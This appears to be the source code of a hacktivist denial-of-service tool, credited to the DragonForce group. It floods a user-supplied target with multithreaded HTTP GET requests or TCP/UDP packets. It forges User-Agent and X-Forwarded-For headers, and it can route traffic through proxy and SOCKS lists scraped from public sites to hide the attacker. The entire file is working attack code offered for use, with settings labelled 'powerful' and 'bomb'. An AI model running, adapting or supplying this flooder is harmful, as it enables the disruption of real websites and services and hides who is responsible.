# Author: Pari Malam

import socket
import socks
import threading
import random
import re
import urllib.request
import os
import sys
import colorama
from colorama import Fore, Style, Back, init

from bs4 import BeautifulSoup

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

if sys.platform.startswith("linux"):
    from scapy.all import *
elif sys.platform.startswith("freebsd"):
    from scapy.all import *
else:
    print (f"TCP/UDP FLOOD Recommend For Lincox User. For Wingays? Pakai HTTP FLOOD. - [TheBest!]")

def banners():
    print(f"""{Style.BRIGHT + Fore.RED}
    ██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗   ██╗ ██████╗ 
    ██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝   ██║██╔═══██╗
    ██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗     ██║██║   ██║
    ██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║
    ██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╗███████╗██╗██║╚██████╔╝
    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝╚═╝ ╚═════╝ 
    {Fore.WHITE}═══════════════════════════════════════════════════════════════════════════════════════════════════════════════{Style.BRIGHT + Fore.YELLOW}  
    Coded By       :      Pari Malam
    Description    :      HTTP Dos [Flood] With Considered 7-Layer [#OpsPETIR CyberTroopers]

                                                   
    Forum          :      https://dragonforce.io
    Github         :      https://github.com/Pari-Malam
    Telegram       :      https://telegram.me/DragonForceIO     I think, ur face got problemo? hehe boiss :P
    {Fore.WHITE}═══════════════════════════════════════════════════════════════════════════════════════════════════════════════""")
banners()

useragents=["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
            "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
            "Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
            "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
            "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
            "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko","Mozilla/1.22 (compatible; MSIE 2.0d; Windows NT)",
            "Mozilla/2.0 (compatible; MSIE 3.02; Update a; Windows NT)",
            "Mozilla/4.0 (compatible; MSIE 4.01; Windows NT)",
            "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 4.0)",
            "Mozilla/4.79 [en] (WinNT; U)",
            "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:0.9.2) Gecko/20010726 Netscape6/6.1",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.4) Gecko/2008102920 Firefox/3.0.4",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.19) Gecko/20081204 SeaMonkey/1.1.14",
            "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaE90-1/210.34.75 Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
            "Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_2 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5G77 Safari/525.20",
            "Mozilla/5.0 (Linux; U; Android 1.5; en-gb; HTC Magic Build/CRB17) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
            "Opera/9.27 (Windows NT 5.1; U; en)",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/3.2.1 Safari/525.27.1",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.4.154.25 Safari/525.19",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.48 Safari/525.19",
            "Wget/1.8.2",
            "Mozilla/5.0 (PLAYSTATION 3; 1.00)",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; (R1 1.6))",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10 (.NET CLR 3.5.30729) JBroFuzz/1.4",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)",
            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20050923 CentOS/1.0.7-1.4.1.centos4 Firefox/1.0.7",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5",
            "Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.7) Gecko/20070606",
            "Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.14) Gecko/20080520 Firefox/2.0.0.14",
            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5",]


def starturl():
    global url
    global url2
    global urlport

    url = input(f"\n{Fore.RED}Sumbat URL/IP: ").strip()

    if url == "":
        print (f"{Fore.GREEN}Please enter the url.")
        starturl()

    try:
        if url[0]+url[1]+url[2]+url[3] == "www.":
            url = "http://" + url
        elif url[0]+url[1]+url[2]+url[3] == "http":
            pass
        else:
            url = "http://" + url
    except:
        print(f"{Fore.RED}You mistyped, try again.")
        starturl()

    try:
        url2 = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
    except:
        url2 = url.replace("http://", "").replace("https://", "").split("/")[0]

    try:
        urlport = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[1]
    except:
        urlport = "80"

    parimalamode()

def parimalamode():
    global choice1
    choice1 = input(f"{Fore.GREEN}Do you want to perform HTTP Flood TheBestDOS! [0], TCP Flood [1] or UDP Flood [2] :- ")
    if choice1 == "0":
        proxymode()
    elif choice1 == "1":
        try:
            if os.getuid() != 0:
                print(f"{Fore.RED}You need to run this program as root to use TCP/UDP flooding.")
                exit(0)
            else:
                parimalamport()
        except:
            pass
    elif choice1 == "2":
        try:
            if os.getuid() != 0:
                print(f"{Fore.RED}You need to run this program as root to use TCP/UDP flooding.")
                exit(0)
            else: # 
                parimalamport()
        except:
            pass
    else:
        print (f"{Fore.RED}You mistyped, try again.")
        parimalamode()

def parimalamport():
    global port
    try:
        port = int(input(f"{Fore.GREEN}Enter the port you want to flood: "))
        portlist = range(65535)
        if port in portlist:
            pass
        else:
            print (f"{Fore.Red}You mistyped, try again.")
            parimalamport()
    except ValueError:
        print (f"{Fore.Red}You mistyped, try again.")
        parimalamport()
    proxymode()

def proxymode():
    global choice2
    choice2 = input(f"{Fore.GREEN}Do you want proxy/socks mode? Answer 'Y' to enable it: ")
    if choice2 == "y":
        choiceproxysocks()
    else:
        numthreads()

def choiceproxysocks():
    global choice3
    choice3 = input("Type '0' to enable proxymode or type '1' to enable socksmode: ")
    if choice3 == "0":
        choicedownproxy()
    elif choice3 == "1":
        choicedownsocks()
    else:
        print (f"{Fore.Red}You mistyped, try again.")
        choiceproxysocks()

def choicedownproxy():
    choice4 = input("Do you want to download a new list of proxy? Answer 'Y' to do it: ")
    if choice4 == "y":
        choicemirror1()
    else:
        proxylist()

def choicedownsocks():
    choice4 = input("Do you want to download a new list of socks? Answer 'Y' to do it: ")
    if choice4 == "y":
        choicemirror2()
    else:
        proxylist()

def choicemirror1():
    global urlproxy
    choice5 = input ("Download from: free-proxy-list.net='0'[TheBest!] or inforge.net='1' ")
    if choice5 == "0":
        urlproxy = "http://free-proxy-list.net/"
        proxyget1()
    elif choice5 == "1":
        inforgeget()
    else:
        print(f"{Fore.Red}You mistyped, try again.")
        choicemirror1()

def choicemirror2():
    global urlproxy
    choice5 = input ("Download from: socks-proxy.net='0'[TheBest!] or inforge.net='1' ")
    if choice5 == "0":
        urlproxy = "https://www.socks-proxy.net/"
        proxyget1()
    elif choice5 == "1":
        inforgeget()
    else:
        print(f"{Fore.Red}You mistyped, try again.")
        choicemirror2()

def proxyget1():
    try:
        req = urllib.request.Request(("%s") % (urlproxy))       
        req.add_header("User-Agent", random.choice(useragents)) 
        sourcecode = urllib.request.urlopen(req)                
        part = str(sourcecode.read())                           
        part = part.split("<tbody>")
        part = part[1].split("</tbody>")
        part = part[0].split("<tr><td>")
        proxies = ""
        for proxy in part:
            proxy = proxy.split("</td><td>")
            try:
                proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
            except:
                pass
        out_file = open("proxy.txt","w")
        out_file.write("")
        out_file.write(proxies)
        out_file.close()
        print (f"Proxies downloaded successfully.")
    except: 
        print (f"\nERROR!\n")
    proxylist() 

def inforgeget(): 
    try:
        if os.path.isfile("proxy.txt"):
            out_file = open("proxy.txt","w") 
            out_file.write("")               
            out_file.close()
        else:
            pass
        url = "https://www.inforge.net/xi/forums/liste-proxy.1118/"
        soup = BeautifulSoup(urllib.request.urlopen(url)) 
        print (f"\nDownloading from inforge.net in progress...")
        base = "https://www.inforge.net/xi/"                       
        for tag in soup.find_all("a", {"class":"PreviewTooltip"}): 
            links = tag.get("href")                                
            final = base + links                                   
            result = urllib.request.urlopen(final)                 
            for line in result :
                ip = re.findall("(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3}):(?:[\d]{1,5})", str(line)) 
                if ip: 
                    for x in ip:
                        out_file = open("proxy.txt","a") 
                        while True:
                            out_file.write(x+"\n")
                            out_file.close()
                            break 
        print (f"{Fore.GREEN}Proxies downloaded successfully.") 
    except: 
        print (f"\nERROR!\n") 
    proxylist() 

def proxylist():
    global proxies
    out_file = str(input("Enter the proxylist filename/path (proxy.txt): "))
    if out_file == "":
        out_file = "proxy.txt"
    proxies = open(out_file).readlines()
    numthreads()

def numthreads():
    global threads
    try:
        threads = int(input("Insert number of threads (800): "))
    except ValueError:
        threads = 800
        print (f"{Fore.GREEN}800 threads selected.\n")
    multiplication()

def multiplication():
    global multiple
    try:
        multiple = int(input("Insert a number of multiplication for the attack [(1-5=normal)(50=powerful)(100 or more=bomb)]: "))
    except ValueError:
        print(f"{Fore.RED}You mistyped, try again.\n")
        multiplication()
    begin()

def begin():
    choice6 = input("Press 'w00t!' to start attack: ")
    if choice6 == "":
        loop()
    elif choice6 == "w00t!": #lool
        loop()
    elif choice6 == "w00t!": #loool
        loop()
    else:
        exit(0)

def loop():
    global threads
    global get_host
    global acceptall
    global connection
    global go
    global x
    if choice1 == "0": 
        get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
        acceptall = ["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", "Accept-Encoding: gzip, deflate\r\n", "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"]
        connection = "Connection: Keep-Alive\r\n" 
    x = 0 
    go = threading.Event()
    if choice1 == "1": 
        if choice2 == "y": 
            if choice3 == "0": 
                for x in range(threads):
                    tcpfloodproxed(x+1).start() 
                    print (f"Thread " + str(x) + " ready!")
                go.set() 
            else: 
                for x in range(threads):
                    tcpfloodsocked(x+1).start() 
                    print (f"Thread " + str(x) + " ready!")
                go.set() 
        else: 
            for x in range(threads):
                tcpflood(x+1).start() 
                print (f"Thread " + str(x) + " ready!")
            go.set() 
    else: 
        if choice1 == "2": 
            if choice2 == "y": 
                if choice3 == "0": 
                    for x in range(threads):
                        udpfloodproxed(x+1).start() 
                        print (f"Thread " + str(x) + " ready!")
                    go.set() 
                else: 
                    for x in range(threads):
                        udpfloodsocked(x+1).start() 
                        print (f"Thread " + str(x) + " ready!")
                    go.set() 
            else: 
                for x in range(threads):
                    udpflood(x+1).start() 
                    print (f"Thread " + str(x) + " ready!")
                go.set() 
        else: 
            if choice2 == "y": 
                if choice3 == "0": 
                    for x in range(threads):
                        requestproxy(x+1).start() 
                        print (f"Thread " + str(x) + " ready!")
                    go.set() 
                else: 
                    for x in range(threads):
                        requestsocks(x+1).start() 
                        print (f"Thread " + str(x) + " ready!")
                    go.set() 
            else: 
                for x in range(threads):
                    requestdefault(x+1).start() 
                    print (f"Thread " + str(x) + " ready!")
                go.set() 

class tcpfloodproxed(threading.Thread): 

    def __init__(self, counter): 
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self): 
        data = random._urandom(1024) 
        p = bytes(IP(dst=str(url2))/TCP(sport=RandShort(), dport=int(port))/data) 
        current = x 
        if current < len(proxies): 
            proxy = proxies[current].strip().split(':')
        else: 
            proxy = random.choice(proxies).strip().split(":")
        go.wait() 
        while True:
            try:
                socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True) 
                s = socks.socksocket() 
                s.connect((str(url2),int(port))) 
                s.send(p) 
                print (f"Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
                try: 
                    for y in range(multiple): 
                        s.send(str.encode(p)) 
                except: 
                    s.close()
            except: 
                s.close() 

class tcpfloodsocked(threading.Thread): 

    def __init__(self, counter): 
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self): 
        data = random._urandom(1024) 
        p = bytes(IP(dst=str(url2))/TCP(sport=RandShort(), dport=int(port))/data) 
        current = x 
        if current < len(proxies): 
            proxy = proxies[current].strip().split(':')
        else: 
            proxy = random.choice(proxies).strip().split(":")
        go.wait() 
        while True:
            try:
                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True) 
                s = socks.socksocket() 
                s.connect((str(url2),int(port))) 
                s.send(p) 
                print (f"Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
                try: 
                    for y in range(multiple): 
                        s.send(str.encode(p)) 
                except: 
                    s.close()
            except: 
                s.close() 
                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) 
                    s = socks.socksocket() 
                    s.connect((str(url2),int(port))) 
                    s.send(p) 
                    print (f"Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
                    try: 
                        for y in range(multiple): 
                            s.send(str.encode(p)) 
                    except: 
                        s.close()
                except: 
                    print (f"Sock down. Retrying request. @", self.counter)
                    s.close() 

class tcpflood(threading.Thread): 

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self): 
        data = random._urandom(1024) 
        p = bytes(IP(dst=str(url2))/TCP(sport=RandShort(), dport=int(port))/data) 
        go.wait() 
        while True: 
            try: 
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
                s.connect((str(url2),int(port))) 
                s.send(p) 
                print (f"Request Sent! @", self.counter) 
                try: 
                    for y in range(multiple): 
                        s.send(str.encode(p)) 
                except: 
                    s.close()
            except: 
                s.close() 

class udpfloodproxed(threading.Thread): 

    def __init__(self, counter): 
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self): 
        data = random._urandom(1024) 
        p = bytes(IP(dst=str(url2))/UDP(dport=int(port))/data) 
        current = x 
        if current < len(proxies): 
            proxy = proxies[current].strip().split(':')
        else: 
            proxy = random.choice(proxies).strip().split(":")
        go.wait() 
        while True:
            try:
                socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True) 
                s = socks.socksocket() 
                s.connect((str(url2),int(port))) 
                s.send(p) 
                print (f"Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
                try: 
                    for y in range(multiple): 
                        s.send(str.encode(p)) 
                except: 
                    s.close()
            except: 
                s.close() 

class udpfloodsocked(threading.Thread): 

    def __init__(self, counter): 
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self): 
        data = random._urandom(1024) 
        p = bytes(IP(dst=str(url2))/UDP(dport=int(port))/data) 
        current = x 
        if current < len(proxies): 
            proxy = proxies[current].strip().split(':')
        else: 
            proxy = random.choice(proxies).strip().split(":")
        go.wait() 
        while True:
            try:
                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True) 
                s = socks.socksocket() 
                s.connect((str(url2),int(port))) 
                s.send(p) 
                print (f"Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
                try: 
                    for y in range(multiple): 
                        s.send(str.encode(p)) 
                except: 
                    s.close()
            except: 
                s.close() 
                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) 
                    s = socks.socksocket() 
                    s.connect((str(url2),int(port))) 
                    s.send(p) 
                    print (f"Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
                    try: 
                        for y in range(multiple): 
                            s.send(str.encode(p)) 
                    except: 
                        s.close()
                except: 
                    print (f"Sock down. Retrying request. @", self.counter)
                    s.close() 

class udpflood(threading.Thread): 

    def __init__(self, counter): 
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self): 
        data = random._urandom(1024) 
        p = bytes(IP(dst=str(url2))/UDP(dport=int(port))/data) 
        go.wait() 
        while True: 
            try: 
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
                s.connect((str(url2),int(port))) 
                s.send(p) 
                print (f"Request Sent! @", self.counter) 
                try: 
                    for y in range(multiple): 
                        s.send(str.encode(p)) 
                except: 
                    s.close()
            except: 
                s.close() 

class requestproxy(threading.Thread): 

    def __init__(self, counter): 
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self): 
        useragent = "User-Agent: " + random.choice(useragents) + "\r\n" 
        accept = random.choice(acceptall) 
        randomip = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
        forward = "X-Forwarded-For: " + randomip + "\r\n" 
        request = get_host + useragent + accept + forward + connection + "\r\n" 
        current = x 
        if current < len(proxies): 
            proxy = proxies[current].strip().split(':')
        else: 
            proxy = random.choice(proxies).strip().split(":")
        go.wait() 
        while True: 
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
                s.connect((str(proxy[0]), int(proxy[1]))) 
                s.send(str.encode(request)) 
                print (f"Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
                try: 
                    for y in range(multiple): 
                        s.send(str.encode(request)) 
                except: 
                    s.close()
            except:
                s.close() 

class requestsocks(threading.Thread): 

    def __init__(self, counter): 
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self): 
        useragent = "User-Agent: " + random.choice(useragents) + "\r\n" 
        accept = random.choice(acceptall) 
        request = get_host + useragent + accept + connection + "\r\n" 
        current = x 
        if current < len(proxies): 
            proxy = proxies[current].strip().split(':')
        else: 
            proxy = random.choice(proxies).strip().split(":")
        go.wait() 
        while True:
            try:
                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True) 
                s = socks.socksocket() 
                s.connect((str(url2), int(urlport))) 
                s.send (str.encode(request)) 
                print (f"Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
                try: 
                    for y in range(multiple): 
                        s.send(str.encode(request)) 
                except: 
                    s.close()
            except: 
                s.close() 
                try: 
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) 
                    s = socks.socksocket() 
                    s.connect((str(url2), int(urlport))) 
                    s.send (str.encode(request)) 
                    print (f"Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
                    try: 
                        for y in range(multiple): 
                            s.send(str.encode(request)) 
                    except: 
                        s.close()
                except:
                    print (f"Sock down. Retrying request. @", self.counter)
                    s.close() 

class requestdefault(threading.Thread): 

    def __init__(self, counter): 
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self): 
        useragent = "User-Agent: " + random.choice(useragents) + "\r\n" 
        accept = random.choice(acceptall) 
        request = get_host + useragent + accept + connection + "\r\n" 
        go.wait() 
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
                s.connect((str(url2), int(urlport))) 
                s.send (str.encode(request)) 
                print (f"Request sent! @", self.counter) 
                try: 
                    for y in range(multiple): 
                        s.send(str.encode(request)) 
                except: 
                    s.close()
            except: 
                s.close() 

starturl() 